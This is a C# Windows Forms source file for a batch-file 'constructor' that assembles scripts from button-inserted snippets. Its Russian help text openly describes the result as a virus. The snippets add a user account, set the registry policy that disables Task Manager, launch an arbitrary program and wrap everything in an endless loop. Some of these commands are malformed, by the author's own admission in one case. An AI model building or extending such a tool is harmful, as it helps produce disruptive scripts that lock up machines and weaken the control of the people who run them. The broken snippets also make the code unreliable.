using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BasicLang
{
    public partial class Construct : Form
    {
        public Construct()
        {
            InitializeComponent();
        }

        private void siticoneButton11_Click(object sender, EventArgs e)
        {
            MessageBox.Show("P.S : Сохраняй в .bat");
            SaveFileDialog saveFileDialog1 = new SaveFileDialog();
            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
            {
                using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.CreateNew))
                using (StreamWriter sw = new StreamWriter(s))
                {
                    sw.Write(text.Text);
                }
            }
        }

        private void siticoneButton1_Click(object sender, EventArgs e)
        {

            text.InsertText("@echo off");

        }

        private void siticoneCircleButton1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void siticoneCircleButton2_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }
        Point lastPoint;
        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            lastPoint = new Point(e.X, e.Y);
        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastPoint.X;
                this.Top += e.Y - lastPoint.Y;
            }
        }

        private void siticoneButton2_Click(object sender, EventArgs e)
        {
            text.InsertText("\nuser NAME PASSWORD /add");
        }

        private void siticoneButton4_Click(object sender, EventArgs e)
        {
            text.InsertText("\nREG add HKCU/Software/Microsoft/Windows/CurrentVersion/Policies/System /v DisableTaskMgr /t REG_DWORD /d /0 /f");
        }

        private void siticoneButton5_Click(object sender, EventArgs e)
        {
            text.InsertText("\nstart you-proga.exe");
        }

        private void siticoneButton6_Click(object sender, EventArgs e)
        {
            text.InsertText("\necho text");
        }

        private void siticoneButton7_Click(object sender, EventArgs e)
        {
            text.InsertText("\ntitle name");
        }

        private void siticoneButton10_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Поменяйте у HKCU/Software/Microsoft/Windows/CurrentVersion/Policies/System слеши на зеркальные слешы. Я не написал код с этими слешами потому-что Visual Studio этого не позволяет зделать", "Помощь с коммандой");
        }

        private void siticoneButton9_Click(object sender, EventArgs e)
        {
            MessageBox.Show("В конструкторе у нас переменная, это как цикл. Просто скопируй вирус без цикла, и втавь внутрь :loop, goto loop. P.S : Название переменной можно менять", "Цикл");
        }

        private void siticoneButton8_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Где я написал name, text, password и loop. P.S : По поводу переменных почитайте второй вопрос + password - не обязательный тег, его можно удалить", "Названия и т.п");
        }

        private void siticoneButton3_Click(object sender, EventArgs e)
        {
            text.InsertText("\n:loop\n\ngoto loop");
        }
    }
}
